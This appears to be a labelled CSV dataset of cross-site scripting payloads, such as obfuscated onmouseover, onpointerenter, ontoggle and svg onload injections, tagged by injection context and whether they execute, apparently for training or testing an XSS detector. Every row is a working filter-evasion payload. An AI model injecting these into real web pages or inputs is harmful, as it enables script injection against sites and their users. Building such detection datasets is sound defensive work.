payload,context,exec,combined
<HTml/+/OnmousEoVeR+=+confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTml/+/OnmousEoVeR+=+confirm()//
"<DETaILs/+/OnPOInTerEntEr%0d=%0da=prompt,a()%0dx//",url_navigation,0,"CTX_url_navigation CTX_url_navigation CTX_url_navigation <DETaILs/+/OnPOInTerEntEr%0d=%0da=prompt,a()%0dx//"
""" onclick=alert(1) """,html_attribute,1,"CTX_html_attribute CTX_html_attribute CTX_html_attribute "" onclick=alert(1) """
<detAiLs%0aoNtogGle+=+confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAiLs%0aoNtogGle+=+confirm()//
""";alert(location);//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag "";alert(location);//"
<a%0aonPoIntERENter%0a=%0a(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aonPoIntERENter%0a=%0a(prompt)``>v3dm0s
<d3v%09oNpoiNtereNTeR+=+(prompt)``%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09oNpoiNtereNTeR+=+(prompt)``%0dx>v3dm0s
<D3v/+/OnpoINteRenTer%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/OnpoINteRenTer%09=%09(confirm)()%0dx>v3dm0s
"<d3v%09ONpOInTErenter+=+a=prompt,a()>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09ONpOInTErenter+=+a=prompt,a()>v3dm0s"
<HTML/+/onMOuSeOver%0d=%0d(prompt)``>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTML/+/onMOuSeOver%0d=%0d(prompt)``>
<D3v%09oNmoUseOVER%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09oNmoUseOVER%0a=%0aconfirm()%0dx>v3dm0s
<D3V/+/OnPOintErenTEr%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/OnPOintErenTEr%0a=%0a(prompt)``%0dx>v3dm0s
<a%0aonpoINTERenteR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aonpoINTERenteR%09=%09confirm()>v3dm0s
<d3V%09oNmoUSEovER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09oNmoUSEovER%0d=%0dconfirm()%0dx>v3dm0s
<DETAiLS%0dONtOggle%09=%09(confirm)()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETAiLS%0dONtOggle%09=%09(confirm)()%0dx//
<d3v%0aONPoiNTErenteR%09=%09(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0aONPoiNTErenteR%09=%09(prompt)``>v3dm0s
<Html%0donpoINTeREntER+=+confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Html%0donpoINTeREntER+=+confirm()>
"<iframe srcdoc=""<svg onload=alert(1)>"">",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <iframe srcdoc=""<svg onload=alert(1)>"">"
"<d3v/+/OnMoUSEOvER%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3v/+/OnMoUSEOvER%0d=%0da=prompt,a()%0dx>v3dm0s"
<A%0aoNmouseOvER%09=%09[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aoNmouseOvER%09=%09[8].find(confirm)>v3dm0s
<a%09ONPoiNTErEnTEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09ONPoiNTErEnTEr%09=%09confirm()%0dx>v3dm0s
<d3V%0dOnpOINterENTer%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0dOnpOINterENTer%0d=%0d[8].find(confirm)>v3dm0s
<D3V%0aonMousEOvER+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aonMousEOvER+=+confirm()>v3dm0s
<deTAILS%0dOnPoiNtEReNTEr%0d=%0d(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTAILS%0dOnPoiNtEReNTEr%0d=%0d(confirm)()%0dx>
<D3v%0dONmousEOveR%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0dONmousEOveR%09=%09(confirm)()>v3dm0s
<d3V%0dONPOInteRENTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dONPOInteRENTer%0d=%0dconfirm()%0dx>v3dm0s
<details open ontoggle=alert(1)>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <details open ontoggle=alert(1)>
<HtML%09OnmouseOVER%0a=%0aconfirm()%0dx>,script_block,0,CTX_script_block CTX_script_block CTX_script_block <HtML%09OnmouseOVER%0a=%0aconfirm()%0dx>
<DEtAils/+/ONTOGGlE%09=%09confirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtAils/+/ONTOGGlE%09=%09confirm()%0dx>
<D3V%0aONpOInTEREnTeR%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aONpOInTEREnTeR%0d=%0d(confirm)()>v3dm0s
<HTMl%0aoNMouSeovER%0d=%0d[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTMl%0aoNMouSeovER%0d=%0d[8].find(confirm)>
"<dETaiLs%0aonpOInteRENteR+=+a=prompt,a()%0dx//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <dETaiLs%0aonpOInteRENteR+=+a=prompt,a()%0dx//"
<d3V%0aONPOiNTerEnTeR%0d=%0d(prompt)``%0dx>v3dm0s,url_navigation,0,CTX_url_navigation CTX_url_navigation CTX_url_navigation <d3V%0aONPOiNTerEnTeR%0d=%0d(prompt)``%0dx>v3dm0s
<D3v%09onmoUseOVER%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%09onmoUseOVER%0d=%0d(confirm)()>v3dm0s
<htMl%0aONmOUSeOVEr%0d=%0dconfirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htMl%0aONmOUSeOVEr%0d=%0dconfirm()%0dx>
<Html/+/onPoiNTEReNTEr+=+confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <Html/+/onPoiNTEReNTEr+=+confirm()//
<D3v%0aoNMousEOvER+=+(confirm)()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <D3v%0aoNMousEOvER+=+(confirm)()>v3dm0s
"<HtML/+/oNmoUseoVeR%09=%09a=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <HtML/+/oNmoUseoVeR%09=%09a=prompt,a()>"
""" onmouseover=alert(1)",html_attribute,1,"CTX_html_attribute CTX_html_attribute CTX_html_attribute "" onmouseover=alert(1)"
<A%0doNPOiNTEreNteR%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0doNPOiNTEreNteR%0a=%0a[8].find(confirm)%0dx>v3dm0s
<a%09ONmouseOvEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09ONmouseOvEr%0d=%0d[8].find(confirm)>v3dm0s
"<htmL%09OnpoINterENter%0a=%0aa=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <htmL%09OnpoINterENter%0a=%0aa=prompt,a()%0dx>"
<dEtaiLs/+/onpOiNTeREnTER+=+[8].find(confirm)//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtaiLs/+/onpOiNTeREnTER+=+[8].find(confirm)//
<D3V%0donpoInterEntEr%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0donpoInterEntEr%09=%09confirm()>v3dm0s
<a%09ONpoiNTERENtER%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09ONpoiNTERENtER%09=%09confirm()>v3dm0s
<a%0dOnPOintErEnTeR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0dOnPOintErEnTeR%0a=%0a(prompt)``%0dx>v3dm0s
<deTaiLS%0aontOgGle+=+[8].find(confirm)//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTaiLS%0aontOgGle+=+[8].find(confirm)//
<dEtAIlS%0aoNtOgGlE%0d=%0dconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtAIlS%0aoNtOgGlE%0d=%0dconfirm()>
</textarea><svg/onload=alert(1)>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag </textarea><svg/onload=alert(1)>
<hTMl%0aoNPoiNTeRentER%0d=%0d[8].find(confirm)%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTMl%0aoNPoiNTeRentER%0d=%0d[8].find(confirm)%0dx>
<A/+/oNpoInteReNter%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/oNpoInteReNter%0d=%0d[8].find(confirm)%0dx>v3dm0s
"<htMl/+/onpoINTEREntEr%0a=%0aa=prompt,a()%0dx>",url_navigation,0,"CTX_url_navigation CTX_url_navigation CTX_url_navigation <htMl/+/onpoINTEREntEr%0a=%0aa=prompt,a()%0dx>"
<d3V%0aOnmOUSeOvEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aOnmOUSeOvEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<HtMl/+/onpOINTERenTER%09=%09[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtMl/+/onpOINTERenTER%09=%09[8].find(confirm)%0dx//
<HTML%0aOnpOInTEreNteR+=+confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTML%0aOnpOInTEreNteR+=+confirm()%0dx>
<hTml%09onPoInteReNTer%0d=%0d(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTml%09onPoInteReNTer%0d=%0d(prompt)``%0dx//
<a%0doNMoUSeoVEr%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0doNMoUSeoVEr%09=%09(confirm)()>v3dm0s
<hTML/+/oNPOInTeRENter+=+confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTML/+/oNPOInTeRENter+=+confirm()//
<d3V%0dOnPOIntEREntER%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dOnPOIntEREntER%0d=%0dconfirm()>v3dm0s
<d3V%0aONpoINtereNTeR%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0aONpoINtereNTeR%0d=%0d(prompt)``>v3dm0s
<htMl/+/onPoiNTEREntEr%09=%09(confirm)()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htMl/+/onPoiNTEREntEr%09=%09(confirm)()//
<html%0dONpointERenter+=+[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <html%0dONpointERenter+=+[8].find(confirm)>
"<a%09onpointERenTeR%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%09onpointERenTeR%0d=%0da=prompt,a()>v3dm0s"
"<htML%0aONpOIntereNtER%0d=%0da=prompt,a()//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <htML%0aONpOIntereNtER%0d=%0da=prompt,a()//"
<D3v/+/OnPoINtEreNtEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v/+/OnPoINtEreNtEr%0d=%0d[8].find(confirm)>v3dm0s
<html%0dOnpoinTEreNter%0a=%0aconfirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <html%0dOnpoinTEreNter%0a=%0aconfirm()%0dx>
<A/+/oNmOuseovER%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/oNmOuseovER%09=%09confirm()>v3dm0s
<HtmL%0aONMOUSeOVEr%0a=%0a[8].find(confirm)//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%0aONMOUSeOVEr%0a=%0a[8].find(confirm)//
<a/+/OnPOInTeRenTer%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/OnPOInTeRenTer%0d=%0d[8].find(confirm)>v3dm0s
<d3v%0aOnMouSEoVEr%0a=%0a(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0aOnMouSEoVEr%0a=%0a(confirm)()>v3dm0s
"<DeTAILS%09oNpointErEntEr+=+a=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DeTAILS%09oNpointErEntEr+=+a=prompt,a()//"
<a%09ONPoiNTErEnTEr%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09ONPoiNTErEnTEr%09=%09confirm()%0dx>v3dm0s
<html%09onMOuSEOVER%0d=%0d(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <html%09onMOuSEOVER%0d=%0d(prompt)``//
<DEtAilS/+/ONToGgLE%0d=%0d[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DEtAilS/+/ONToGgLE%0d=%0d[8].find(confirm)%0dx>
<DETAILS%0aonTogGlE%0a=%0a(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETAILS%0aonTogGlE%0a=%0a(prompt)``%0dx//
"<d3v/+/ONMouSeover+=+a=prompt,a()>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/ONMouSeover+=+a=prompt,a()>v3dm0s"
<htMl/+/onMOUSeOvEr%0d=%0d(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <htMl/+/onMOUSeOvEr%0d=%0d(prompt)``%0dx//
"<a%09onMouseOver%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%09onMouseOver%0a=%0aa=prompt,a()>v3dm0s"
<d3v/+/oNpoinTereNTeR+=+[8].find(confirm)>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/oNpoinTereNTeR+=+[8].find(confirm)>v3dm0s
<A/+/onPoiNTeRentEr%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/onPoiNTeRentEr%0d=%0d(confirm)()%0dx>v3dm0s
<a%09ONMOUsEOVeR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09ONMOUsEOVeR%0d=%0d(prompt)``>v3dm0s
<d3v/+/oNMOUSEOver%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/oNMOUSEOver%0d=%0dconfirm()%0dx>v3dm0s
<htMl%09oNMOuSeOVeR%09=%09(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htMl%09oNMOuSeOVeR%09=%09(confirm)()//
"<A%0donPOinTERENTER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%0donPOinTERENTER%0a=%0aa=prompt,a()%0dx>v3dm0s"
<d3V/+/onpoinTeRenTeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/onpoinTeRenTeR%09=%09[8].find(confirm)%0dx>v3dm0s
<d3v%0aonmOusEOVEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0aonmOusEOVEr%0d=%0d[8].find(confirm)>v3dm0s
"<d3v%0aOnMOuSeover+=+a=prompt,a()%0dx>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0aOnMOuSeover+=+a=prompt,a()%0dx>v3dm0s"
;alert(1);//,html_text,0,CTX_html_text CTX_html_text CTX_html_text ;alert(1);//
<htmL%09OnmouSeoVeR%0a=%0aconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htmL%09OnmouSeoVeR%0a=%0aconfirm()>
<d3V/+/oNPOintEReNTER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/oNPOintEReNTER%0d=%0dconfirm()%0dx>v3dm0s
"<D3V%0dOnPOiNTERENTeR+=+a=prompt,a()%0dx>v3dm0s",url_navigation,0,"CTX_url_navigation CTX_url_navigation CTX_url_navigation <D3V%0dOnPOiNTERENTeR+=+a=prompt,a()%0dx>v3dm0s"
<A%0dOnpOINTErenteR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dOnpOINTErenteR%0d=%0d[8].find(confirm)%0dx>v3dm0s
<a/+/oNPOINtEReNtEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/oNPOINtEReNtEr%0d=%0d(confirm)()>v3dm0s
<a/+/ONpOINtERENtER%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/ONpOINtERENtER%0d=%0d(confirm)()>v3dm0s
<html/+/onmoUSEOVER%09=%09confirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <html/+/onmoUSEOVER%09=%09confirm()%0dx>
"<DeTAIls%0aONpoiNtErENTEr%0d=%0da=prompt,a()%0dx//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DeTAIls%0aONpoiNtErENTEr%0d=%0da=prompt,a()%0dx//"
<A%09ONmOUSEovER+=+confirm()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%09ONmOUSEovER+=+confirm()>v3dm0s
<D3v%0dOnPOiNteRenteR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0dOnPOiNteRenteR%09=%09(prompt)``%0dx>v3dm0s
<HtML%0aoNMOUSeoVEr%0a=%0aconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtML%0aoNMOUSeoVEr%0a=%0aconfirm()%0dx>
<a%0dONmoUSeOver+=+confirm()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a%0dONmoUSeOver+=+confirm()>v3dm0s
"<hTmL%09OnPoIntEreNtEr%0d=%0da=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <hTmL%09OnPoIntEreNtEr%0d=%0da=prompt,a()//"
<DetaILS%09OntOGGlE+=+(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DetaILS%09OntOGGlE+=+(confirm)()>
<d3v/+/ONMousEoveR%0a=%0a(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v/+/ONMousEoveR%0a=%0a(prompt)``>v3dm0s
<HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>
<A/+/ONpointEreNTEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/ONpointEreNTEr%0d=%0dconfirm()%0dx>v3dm0s
<A%0aoNmOUSEOveR+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aoNmOUSEOveR+=+confirm()>v3dm0s
<Html%09OnmOUSEOVeR%09=%09(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Html%09OnmOUSEOVeR%09=%09(prompt)``%0dx>
<d3v%09onmOUSeoveR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09onmOUSeoveR%09=%09confirm()>v3dm0s
<a%0donpoiNtERENTer%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0donpoiNtERENTer%0d=%0d(confirm)()>v3dm0s
<dEtAIlS%0doNtOGGlE%0a=%0aconfirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dEtAIlS%0doNtOGGlE%0a=%0aconfirm()>
"<detAiLs/+/onTOGgle+=+a=prompt,a()%0dx//",script_block,0,"CTX_script_block CTX_script_block CTX_script_block <detAiLs/+/onTOGgle+=+a=prompt,a()%0dx//"
<details%0aOntoGgLE%09=%09(confirm)()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <details%0aOntoGgLE%09=%09(confirm)()%0dx//
<d3V%0aOnpOINTerEnTeR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aOnpOINTerEnTeR%0a=%0a[8].find(confirm)>v3dm0s
<dEtAIlS%0doNtOGGlE%0a=%0aconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtAIlS%0doNtOGGlE%0a=%0aconfirm()>
<A/+/OnMOuSeoVeR%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/OnMOuSeoVeR%0a=%0aconfirm()%0dx>v3dm0s
<d3V%0doNMoUSeOveR%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0doNMoUSeOveR%09=%09confirm()>v3dm0s
<d3V%09OnPOiNteRenTEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09OnPOiNteRenTEr%0d=%0d(prompt)``%0dx>v3dm0s
"<HtmL/+/ONMoUSEOVeR+=+a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <HtmL/+/ONMoUSEOVeR+=+a=prompt,a()>"
<a/+/oNPOiNTEReNtEr+=+[8].find(confirm)%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a/+/oNPOiNTEReNtEr+=+[8].find(confirm)%0dx>v3dm0s
<HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>
"<DetAILS%09oNtOgglE%09=%09a=prompt,a()%0dx>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DetAILS%09oNtOgglE%09=%09a=prompt,a()%0dx>"
<deTAiLS%0donpOINTERENTEr%09=%09[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTAiLS%0donpOINTERENTEr%09=%09[8].find(confirm)>
<d3v%09ONMoUseover%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%09ONMoUseover%0d=%0d[8].find(confirm)>v3dm0s
<A/+/OnmOUSeOvEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/OnmOUSeOvEr%0d=%0d(prompt)``%0dx>v3dm0s
<hTml/+/OnMOuSeOver%09=%09[8].find(confirm)//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTml/+/OnMOuSeOver%09=%09[8].find(confirm)//
<d3v%09oNPOINtErEnTeR+=+(confirm)()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09oNPOINtErEnTeR+=+(confirm)()>v3dm0s
<dEtAiLS/+/ONpoINtEReNtER%09=%09(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dEtAiLS/+/ONpoINtEReNtER%09=%09(confirm)()>
<hTML/+/onmoUSEOVEr%09=%09(confirm)()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTML/+/onmoUSEOVEr%09=%09(confirm)()//
<detAils%0doNtoGGLE%0a=%0a[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAils%0doNtoGGLE%0a=%0a[8].find(confirm)%0dx//
<A%0dONPOinTErEnTer+=+(prompt)``>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%0dONPOinTErEnTer+=+(prompt)``>v3dm0s
<D3V%0dONMOusEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0dONMOusEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s
<DeTAILS/+/OntogGle%09=%09confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTAILS/+/OntogGle%09=%09confirm()//
<DeTails%09OnpOIntErENtEr%09=%09(prompt)``%0dx>,html_attribute,0,CTX_html_attribute CTX_html_attribute CTX_html_attribute <DeTails%09OnpOIntErENtEr%09=%09(prompt)``%0dx>
<Html%0dOnMOUSeOVEr+=+confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Html%0dOnMOUSeOVEr+=+confirm()>
<D3V%09onpOiNTereNtEr%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09onpOiNTereNtEr%0d=%0d(confirm)()%0dx>v3dm0s
<DEtAiLs%09ONtOGGLE%0a=%0a(confirm)()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtAiLs%09ONtOGGLE%0a=%0a(confirm)()%0dx//
<DEtaiLs%0aONTOGglE+=+confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtaiLs%0aONTOGglE+=+confirm()>
<D3V%0aonPOinTErENter+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aonPOinTErENter+=+[8].find(confirm)%0dx>v3dm0s
<dETAILS%09onTOGglE%0d=%0d(prompt)``//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETAILS%09onTOGglE%0d=%0d(prompt)``//
<HTML/+/ONmouSEoVer%0d=%0d[8].find(confirm)%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTML/+/ONmouSEoVer%0d=%0d[8].find(confirm)%0dx>
"<HTML%0dOnmouseoVEr%09=%09a=prompt,a()%0dx//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <HTML%0dOnmouseoVEr%09=%09a=prompt,a()%0dx//"
<deTaiLs%09oNpoINteREntEr%0d=%0d(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTaiLs%09oNpoINteREntEr%0d=%0d(confirm)()%0dx//
